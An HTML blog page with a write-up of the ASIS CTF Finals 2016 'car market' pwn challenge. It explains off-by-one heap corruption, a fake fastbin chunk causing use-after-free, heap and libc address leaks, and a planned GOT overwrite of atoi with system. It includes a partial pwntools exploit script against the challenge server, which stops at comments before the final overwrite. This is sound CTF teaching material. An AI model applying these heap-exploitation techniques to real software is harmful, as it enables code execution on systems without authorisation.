<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>ASIS CTF Finals 2016 – car market - Hacking Tube 2.0</title>
<meta name="description" content="Category: pwnPoints: 177">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:title" content="ASIS CTF Finals 2016 – car market">
<meta property="og:url" content="http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/">


  <meta property="og:description" content="Category: pwnPoints: 177">







  <meta property="article:published_time" content="2016-09-13T16:54:00+08:00">






<link rel="canonical" href="http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/">













<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if lte IE 9]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    <div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <a class="site-title" href="/">Hacking Tube 2.0</a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/archives/" >Archive</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle Menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="http://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
    
    
      <p class="author__bio" itemprop="description">
        Vulnerability Researcher / CTFer
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="/about"><i class="fas fa-fw fa-user" aria-hidden="true"></i> About</a></li>
          
        
          
            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
          
            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> RSS</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
    <meta itemprop="headline" content="ASIS CTF Finals 2016 – car market">
    <meta itemprop="description" content="Category: pwnPoints: 177">
    <meta itemprop="datePublished" content="September 13, 2016">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">ASIS CTF Finals 2016 – car market
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p><strong>Category:</strong> pwn
<strong>Points:</strong> 177</p>

<!-- more -->

<p>64 bit ELF, with <strong>Partial RELRO, Canary &amp; NX enabled, no PIE</strong>. <code class="highlighter-rouge">libc.so</code> was provided.</p>

<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="highlighter-rouge">car</code> and <code class="highlighter-rouge">customer</code> are defined as the following structures:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">car</span><span class="p">{</span>
  <span class="kt">char</span> <span class="n">model</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">price</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">customer</span><span class="o">*</span> <span class="n">customer</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">customer</span><span class="p">{</span>
  <span class="kt">char</span> <span class="n">first_name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">comment</span><span class="p">;</span> <span class="c1">// buffer size: 0x48
</span><span class="p">};</span>
</code></pre></div></div>

<p>After doing some reversing &amp; fuzzing, here’s some important program behavior:</p>

<ul>
  <li>There’s a pointer <code class="highlighter-rouge">struct car** ptr</code>. The program will first use <code class="highlighter-rouge">malloc</code> to allocate a buffer and assigned to <code class="highlighter-rouge">ptr</code>, which use the buffer to store the <code class="highlighter-rouge">car*</code> array.</li>
  <li>Each time we add a customer to a car, the program will first check if <code class="highlighter-rouge">car-&gt;customer</code> and <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code> were exist in the car. If it does, the program will free <code class="highlighter-rouge">car-&gt;customer</code> and <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code>, ensure that there’s only one customer in the car.</li>
  <li>There exist multiple <strong>off-by-one</strong> vulnerabilities while the program try to read the user input. When we input the <code class="highlighter-rouge">model</code>, <code class="highlighter-rouge">first_name</code> and the <code class="highlighter-rouge">name</code> data, we can trigger the vulnerability by entering a long length data. <strong>This will cause the first byte of the next data be overwritten to a null byte.</strong></li>
</ul>

<p>The first thing I try to do is to leak some address. I found that if we do the following operation, we can leak heap’s base address:</p>

<ol>
  <li>Enter the customer menu</li>
  <li>Exit the customer menu</li>
  <li>Enter the customer menu again</li>
  <li>Print out the customer info, the customer’s first name will become a heap address</li>
</ol>

<p>This is because the program will try to free the memory of <code class="highlighter-rouge">car-&gt;customer</code> before we try to enter the customer menu for the second time. After <code class="highlighter-rouge">car-&gt;customer</code> was freed, its memory chunk’s fd (<strong>which is also <code class="highlighter-rouge">car-&gt;customer-&gt;first_name</code></strong>) will be storing the next free chunk’s address, so by printing out the customer’s info , we can leak out the heap’s address.</p>

<p>The next thing is to leak out the libc’s address. To achieve this, I decide to corrupted fastbin by exploiting the off-by-one vulnerability. Assume that we have the following memory layout of a <code class="highlighter-rouge">car-&gt;customer</code> structure:</p>
<pre>
             +------------------+
customer     |........first_name| char first_name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+32  |..............name| char name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+64  |        0x12345680| char* comment
             +------------------+
</pre>

<p>By using the off-by-one vulnerability on <code class="highlighter-rouge">car-&gt;customer-&gt;name</code>, <strong>we can overwrite the last byte of <code class="highlighter-rouge">comment</code>’s address, change it from <code class="highlighter-rouge">0x12345680</code> to <code class="highlighter-rouge">0x12345600</code></strong>. Now if we exit &amp; re-enter the customer menu, the program will try to free <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code>, which is <code class="highlighter-rouge">0x12345600</code> instead of <code class="highlighter-rouge">0x12345680</code>.</p>

<p>Now if we have the memory layout of a <code class="highlighter-rouge">car</code> structure like this:</p>
<pre>  
                      +------------------+
    car    0x123455F0 |               0x0| char model[16]
                      +------------------+
                      |              0x51|
                      +------------------+
    car+16 0x12345600 |              0x64| long price
                      +------------------+
    car+24 0x12345608 |        0x12348880| struct customer* customer
                      +------------------+
</pre>

<p>By setting the model of the car, we can fake the chunk’s header, so when glibc’s freeing <code class="highlighter-rouge">0x12345600</code>, it will think that it is freeing a memory chunk with the size of <code class="highlighter-rouge">0x50</code>, <strong>the same size as <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code></strong>, and add <code class="highlighter-rouge">0x12345600</code> into fastbin. This will create an <strong>Use-After-Free</strong> situation, with <code class="highlighter-rouge">0x12345600</code> being a dangling pointer. The next time we create a customer comment, the program will allocate <code class="highlighter-rouge">0x12345600</code> as the comment buffer, <strong>and thus we can modify the structure of <code class="highlighter-rouge">car</code>, changing the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">atoi</code>’s GOT</strong>. After that, we can leak <code class="highlighter-rouge">atoi</code>’s GOT by printing the <code class="highlighter-rouge">car</code>’s info.</p>

<p>To summarize, the following steps will help us leak out the libc’s address:</p>

<ol>
  <li>Add a couple of cars, try to make a <code class="highlighter-rouge">car</code>’s address ends with the <code class="highlighter-rouge">0xf0</code> byte (ex. <code class="highlighter-rouge">0x123455f0</code>), and put the fake chunk header in <code class="highlighter-rouge">car-&gt;model</code>.</li>
  <li>Exploit the off-by-one vulnerability, overwrite a <code class="highlighter-rouge">comment</code>’s buffer address. (ex. <code class="highlighter-rouge">0x12345680</code> -&gt; <code class="highlighter-rouge">0x12345600</code>)</li>
  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="highlighter-rouge">comment</code>’s address.</li>
  <li>Create a new <code class="highlighter-rouge">comment</code>, the new <code class="highlighter-rouge">comment</code>’s buffer will be overlapped with one of those <code class="highlighter-rouge">car</code>’s memory chunk.</li>
  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code>’s structure, change the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">atoi</code>’s GOT.</li>
  <li>Print out the <code class="highlighter-rouge">car</code>’s info, leak <code class="highlighter-rouge">atoi</code>’s GOT and get the libc’s address.</li>
</ol>

<p>Now we have the libc’s address. Since the GOT entries are writable, we can try to overwrite <code class="highlighter-rouge">atoi</code>’s GOT into <code class="highlighter-rouge">system</code>’s address and do the GOT hijacking. At first I try to overwrite the GOT by using the same method as I leak <code class="highlighter-rouge">atoi</code>’s GOT – after we change the <code class="highlighter-rouge">customer</code> pointer, we can overwrite the GOT entry by modifying <code class="highlighter-rouge">customer-&gt;first_name</code>.</p>

<p>Except we can’t. That’s because when we try to do so, the program will try to free <code class="highlighter-rouge">car-&gt;customer</code> before we enter the customer menu, <strong>and doing <code class="highlighter-rouge">free(atoi@got.plt)</code> will crash the program</strong>. We’ll have to find another way to overwrite the GOT. So how are we gonna do that? Well, <strong>remember the <code class="highlighter-rouge">ptr</code> variable?</strong> The pointer that points to the <code class="highlighter-rouge">car*</code> array?</p>

<p>Since we can modify a <code class="highlighter-rouge">car</code>’s structure by editing the comment, we can once again modify <code class="highlighter-rouge">car-&gt;customer</code>, changing the pointer to <code class="highlighter-rouge">ptr</code>, so when the program free <code class="highlighter-rouge">car-&gt;customer</code>, <strong>it will free the whole <code class="highlighter-rouge">car*</code> array instead.</strong> When the next time we create a new comment, it will allocate the memory by splitting the memory chunk from <code class="highlighter-rouge">ptr</code>, <strong>making us able to control the <code class="highlighter-rouge">car*</code> array.</strong> We can then overwrite the <code class="highlighter-rouge">car</code> pointer into <code class="highlighter-rouge">atoi</code>’s GOT by editing the comment. Once the <code class="highlighter-rouge">car</code> pointer is changed, we can overwrite the content by setting <code class="highlighter-rouge">car-&gt;model</code>, and that’s how we hijack <code class="highlighter-rouge">atoi</code>’s GOT.</p>

<p>So after we leak the libc’s address:</p>

<ol>
  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code>’s structure, change the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">ptr</code>.</li>
  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="highlighter-rouge">car-&gt;customer</code>’s address.</li>
  <li>Create a new <code class="highlighter-rouge">comment</code>, the new <code class="highlighter-rouge">comment</code>’s buffer will be overlapped with the <code class="highlighter-rouge">car*</code> array.</li>
  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code> pointer, change it to <code class="highlighter-rouge">atoi</code>’s GOT.</li>
  <li>Overwrite <code class="highlighter-rouge">atoi</code>’s GOT to <code class="highlighter-rouge">system</code>’s address by setting <code class="highlighter-rouge">car-&gt;model</code>.</li>
</ol>

<p>At last, when the program ask us to input our choice, we can input <code class="highlighter-rouge">sh\x00</code> and execute <code class="highlighter-rouge">system('sh')</code>, spawning a shell and get the flag…right?</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"car-market.asis-ctf.ir"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./car_market"</span>
<span class="c">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span>
<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./car_libc.so.6"</span>

<span class="c"># setting </span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">model</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"price</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">sel_car_cust</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cust_zip</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cust_zip</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust mode</span>

<span class="k">def</span> <span class="nf">leak_heap</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add cust</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c"># add com</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"123"</span><span class="p">)</span> <span class="c"># input com</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add cust</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c"># list</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xb90</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">heap_base</span>

<span class="k">def</span> <span class="nf">leak_got</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
    <span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atoi_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">atoi_addr</span><span class="p">))</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">atoi_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="c">#r = process(ELF_PATH)</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">17</span><span class="p">):</span>
        <span class="n">model</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">"a"</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
        <span class="n">price</span> <span class="o">=</span> <span class="mi">100</span><span class="o">+</span><span class="n">i</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add car: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">15</span><span class="p">:</span> <span class="c"># fake chunk</span>
            <span class="n">model</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
            <span class="n">price</span> <span class="o">=</span> <span class="mh">0x1111</span>
        <span class="n">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>

    <span class="c"># leak heap base</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking heap base..."</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">leak_heap</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>

    <span class="c"># overflow one byte of heap address</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overflowing heap address..."</span><span class="p">)</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"comment"</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">33</span><span class="p">]</span>
    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
    
    <span class="c"># add comment and overwrite customer pointer, change it to atoi@got.plt</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add customer</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c"># add comment</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit customer menu</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
    
    <span class="c"># leak atoi's got</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking atoi's got &amp; libc base..."</span><span class="p">)</span>
    <span class="n">leak_got</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

    <span class="c"># overwrite customer pointer to heap_base+0x10</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for corrupting car array)..."</span><span class="p">)</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)]</span>
    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>

    <span class="c"># free &amp; reallocate heap_base+0x10 , now we can control the car array </span>
    <span class="c"># after we control the car array, overite car[14] and make it point to atoi's got</span>
